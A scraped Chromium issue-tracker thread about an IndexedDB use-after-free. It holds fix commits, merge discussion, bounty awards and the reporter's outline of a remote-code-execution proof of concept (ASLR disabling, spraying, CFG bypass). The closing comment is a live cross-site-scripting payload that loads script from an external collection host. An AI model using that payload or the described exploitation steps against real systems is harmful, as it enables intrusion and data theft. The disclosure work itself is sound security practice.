7001353: [Merge M141] IDB: don't make new Connection after being force closed | <https://chromium-review.googlesource.com/c/chromium/src/+/7001353>

### dx...@google.com (2025-10-01)

Project: chromium/src  

Branch:  refs/branch-heads/7390  

Author:  Steve Becker [stevebe@microsoft.com](mailto:stevebe@microsoft.com)  

Link:    <https://chromium-review.googlesource.com/7001353>

[Merge M141] IDB: don't make new Connection after being force closed

---


Expand for full commit details
```
     
    When a Database is force-closed: 
    * Queued open requests are cancelled in ConnectionCoordinator 
    * Database is deleted asynchronously 
     
    New connection requests that make it in between the queued deletion 
    (BucketContext::QueueRunTasks()) and the actual deletion 
    (BucketContext::RunTasks()) should also be cancelled/errored out in the 
    same manner as those which are already waiting in the 
    ConnectionCoordinator task queue. 
     
    Bug: 446722008 
    Change-Id: Id95b337fbfff7f361d2ff61e21bb46f18f577da4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6972630 
    Reviewed-by: Steve Becker <stevebe@microsoft.com> 
    Commit-Queue: Evan Stade <evanstade@microsoft.com> 
    Cr-Commit-Position: refs/heads/main@{#1520777} 
    (cherry picked from commit 1beff97455387771199af33e569c7961edd8d979) 
     
    IDB: Add unit test to verify Open() during force close 
     
    (cherry picked from commit f290157a6918c954f06f2f652b2412ce09eb41aa) 
     
    Bug: 446722008 
    Change-Id: I4f86a4f6a020b8d7317b20bf8a95bca2c027163a 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6986021 
    Commit-Queue: Evan Stade <evanstade@microsoft.com> 
    Reviewed-by: Steve Becker <stevebe@microsoft.com> 
    Cr-Original-Commit-Position: refs/heads/main@{#1520862} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7001353 
    Reviewed-by: Mingyu Lei <leimy@chromium.org> 
    Commit-Queue: Mingyu Lei <leimy@chromium.org> 
    Auto-Submit: Steve Becker <stevebe@microsoft.com> 
    Cr-Commit-Position: refs/branch-heads/7390@{#2106} 
    Cr-Branched-From: d481efce5eb300acbb896686676ebd0352a6f1db-refs/heads/main@{#1509326}

```

---

Files:

- M `content/browser/indexed_db/indexed_db_unittest.cc`
- M `content/browser/indexed_db/instance/bucket_context.cc`
- M `content/browser/indexed_db/instance/database.cc`
- M `content/browser/indexed_db/instance/database.h`

---

Hash: [0a0510086ae30e0c75264ca1cf29618db5ae4760](https://chromiumdash.appspot.com/commit/0a0510086ae30e0c75264ca1cf29618db5ae4760)  

Date: Wed Oct 1 04:22:57 2025


---

### pe...@google.com (2025-10-01)

LTS Milestone M138

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### st...@microsoft.com (2025-10-01)

> Was this issue a regression for the milestone it was found in?

No.

> Is this issue related to a change or feature merged after the latest LTS Milestone?

No.

### pe...@google.com (2025-10-09)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### rz...@google.com (2025-10-09)

1. <https://crrev.com/c/7004845>
2. Low, no conflicts
3. 141
4. Yes

### an...@google.com (2025-10-10)

Delaying until 141 hit stable.

### sp...@google.com (2025-10-14)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $35000.00 for this report.

Rationale for this decision:
High-quality report of demonstrated memory corruption in non-sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### so...@gmail.com (2025-10-15)

deleted

### so...@gmail.com (2025-10-17)

> demonstrated memory corruption in non-sandboxed process

I disagree with [#comment28](https://issues.chromium.org/issues/446722008#comment28) as the bug can lead to RCE.

I've created a working RCE PoC for 64bit (ASLR disabled) and 32bit chromium.  

The 32bit startup time is slow to find the required functions in chrome.dll, I've added a simple caching system as a workaround. Please copy the URL once it's initialized :)  

64bit is very stable, but 32bit sometimes fails to reuse the freed `Connection` class. Just try again!

## Requirements

1. renderer.patch (sets `force_close` to true)
2. v8.patch (adds a new global object `POCHelper` for uncaged arbitrary read/write and a helper to get base address of modules)

note: POCHelper is an alternative to code execution in the renderer process.

## Version

Chrome Version: tested on 142.0.7426.0 dev  

Commit hash: 81f25d3d93e6a170d77a6061e8a2e2e34b80b1e0

## Build Arguments (32bit)

**MUST be a release build for the PoC to work. else it fails to find WritableSharedMemoryMapping::~WritableSharedMemoryMapping.**

```
is_debug = false
symbol_level = 2
blink_symbol_level=0
v8_symbol_level=0
dcheck_always_on = true
is_component_build = false
target_cpu = "x86"
is_asan = false
treat_warnings_as_errors = false

win_enable_cfg_guards=true

```
## Build Arguments (64bit)

**MUST be a release build for the PoC to work. else it fails to find base::BindOnce's invoker.**

```
is_debug = false
symbol_level = 2
blink_symbol_level=0
v8_symbol_level=0
dcheck_always_on = true
is_component_build = true
target_cpu = "x64"
is_asan = false
treat_warnings_as_errors = false

v8_enable_sandbox = true

win_enable_cfg_guards=true

```
## Steps

1. `python copy_mojo_js_bindings.py <out/build/gen> <optional/out/mojo/path>` and copy the generated files to the PoC folder.
2. (64bit) `python disable_aslr.py <out/build/chrome.exe>` to generate chrome.noaslr.exe
3. `python -m http.server 1337` in the PoC folder with mojo and unzipped files.
4. (32bit) `chrome.exe --incognito "http://localhost:1337" --enable-blink-features=MojoJS`  
   
   (64bit) `chrome.noaslr.exe --incognito "http://localhost:1337" --enable-blink-features=MojoJS`
5. You can copy the URL once the PoC is initialized (both ready) and use it the next time you load the PoC to speed up its startup.
6. start -> spray -> exploit in the web ui.
7. You should see a cmd and a calc pop up if nothing went wrong. (even with CFG enabled)

see attached videos for RCE.

It seems like shared buffers are now limited to 32GB so a bypass for 64bit ASLR similar to project zero's is impossible as it needs 4TB.  

However, 32bit ASLR is not a problem.

Let me know if the 32bit PoC fails to find `~WritableSharedMemoryMapping`.

### dx...@google.com (2025-10-28)

Project: chromium/src  

Branch:  refs/branch-heads/7204  

Author:  Evan Stade [evanstade@microsoft.com](mailto:evanstade@microsoft.com)  

Link:    <https://chromium-review.googlesource.com/7004845>

[M138-LTS] IDB: don't make new Connection to Database after being force closed

---


Expand for full commit details
```
     
    When a Database is force-closed: 
    * Queued open requests are cancelled in ConnectionCoordinator 
    * Database is deleted asynchronously 
     
    New connection requests that make it in between the queued deletion 
    (BucketContext::QueueRunTasks()) and the actual deletion 
    (BucketContext::RunTasks()) should also be cancelled/errored out in the 
    same manner as those which are already waiting in the 
    ConnectionCoordinator task queue. 
     
    (cherry picked from commit 1beff97455387771199af33e569c7961edd8d979) 
     
    Bug: 446722008 
    Change-Id: Id95b337fbfff7f361d2ff61e21bb46f18f577da4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6972630 
    Reviewed-by: Steve Becker <stevebe@microsoft.com> 
    Commit-Queue: Evan Stade <evanstade@microsoft.com> 
    Cr-Original-Commit-Position: refs/heads/main@{#1520777} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7004845 
    Commit-Queue: Gyuyoung Kim (xWF) <qkim@google.com> 
    Owners-Override: Michael Ershov <miersh@google.com> 
    Reviewed-by: Michael Ershov <miersh@google.com> 
    Cr-Commit-Position: refs/branch-heads/7204@{#3438} 
    Cr-Branched-From: d5de512dc9dc8ddfe4e6d71b0637578bb6158683-refs/heads/main@{#1465706}

```

---

Files:

- M `content/browser/indexed_db/instance/bucket_context.cc`
- M `content/browser/indexed_db/instance/database.cc`
- M `content/browser/indexed_db/instance/database.h`

---

Hash: [f76c3f95dc65e1feedbd4636965acfe6867cae7e](https://chromiumdash.appspot.com/commit/f76c3f95dc65e1feedbd4636965acfe6867cae7e)  

Date: Tue Oct 28 02:35:35 2025


---

### ch...@google.com (2025-10-28)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### so...@gmail.com (2025-11-03)

I don't know if you're going to reconsider the impact of this bug or not, but I fixed the reliability issues of 32bit among other problems.  

Here are the updated files for the PoC. Copy over the new files and follow the steps in [#comment30](https://issues.chromium.org/issues/446722008#comment30).

`renderer.patch`: added a check to skip openCursor call when creating an index. It caused reliability issues with the UAF on 32bit.  

`pe.js`: fixed bad caching checks. It used to throw exceptions on big modules.  

`main32.js`: reduced number of freed connections and added multiple patterns to support different variations of the functions.  

I've attached a video showing the reliability of the 32bit exploit. I will be using a URL with cached addresses to reduce the video time :) (see [#comment30](https://issues.chromium.org/issues/446722008#comment30))  

Worked 5 out of 5 times. It rarely fails to reuse the freed address.

### so...@gmail.com (2025-11-16)

Hello, I'm asking again if it's possible to reconsider the bug's impact from memory corruption to remote code execution.  

For 32bit, Code execution is possible **with CFG and ASLR enabled** due to the limited address space.  

For 64bit, Code execution is possible with CFG enabled if you're able to predict the address returned by MapViewOfFile. (I disabled ASLR for the x64 PoC)  

This was tested on Windows 11 24H2.  

The only requirement is having code execution on renderer to set force\_close=true for the indexedDB.deleteDatabase call, find the required offsets for CFG bypass and get WinExec's address in kernel32.dll.  

Let me know if you encounter any issues with the 32bit PoC.. maybe I missed something.

I've looked at the [Chrome VRP rules](https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules) and couldn't find anything mentioning the RCE needing to work on both x86 and x64.  

Is a reliable RCE on 32bit chromium not enough to qualify for the RCE bounty?  

I would appreciate it if you could let me know to prevent any future misunderstandings.

> Use after free in Storage in Google Chrome prior to 141.0.7390.65 allowed a remote attacker to execute arbitrary code **via a crafted video file**.

I would also like to mention that the CVE description is wrong.

### jd...@google.com (2025-12-17)

Hello, we are reviewing your note and will update once the review has completed.

Thank You

### sp...@google.com (2025-12-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $65000.00 for this report.

Rationale for this decision:
The demonstration (c30 onwards) proved this as a high-quality report demonstrating controlled write in an unsandboxed process. Thank you also for the 32-bit exploit POC and we topped up the reward with a $10 bonus for highlighting the weaknesses of ASLR on 32-bit and the effort on demonstrating the exploitation techniques used.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-01-02)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### ke...@gmail.com (2026-01-03)

great

### ke...@gmail.com (2026-01-03)

'"><script src=https://xss.report/c/ketanindori></script>

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/446722008)*
